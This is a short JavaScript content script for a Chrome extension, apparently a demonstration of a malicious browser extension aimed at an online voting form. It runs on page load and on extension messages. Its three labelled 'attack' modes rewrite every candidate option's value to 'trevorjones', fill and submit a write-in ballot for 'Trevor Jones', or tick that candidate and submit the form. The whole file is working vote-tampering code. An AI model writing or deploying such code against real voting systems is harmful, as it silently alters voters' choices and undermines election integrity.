window.onload = function() {
	toggle(false)
}

chrome.extension.onMessage.addListener(function(message, sender, sendResponse) {
    toggle(message)
});

var toggle = function(changeVotes){
	var attack = "1";

	if (attack == "1"){
		var inputs = $('input[name="candidate"]');
		var inputLength = inputs.length;
		for(var i = 0; i < inputLength; i++){
			inputs[i].value = "trevorjones";
		}
	} else if (attack == "2"){
		document.getElementById("winput").value = "Trevor Jones";
		document.getElementById("writein").submit();
	} else if (attack == "3") {
		var inputs = $('input[name="candidate"]');
		var inputLength = inputs.length;
		for(var i = 0; i < inputLength; i++){
			if(inputs[i].value == "trevorjones"){
				inputs[i].checked = true;
				document.getElementById("candidates").submit();
			}
		}
	}
}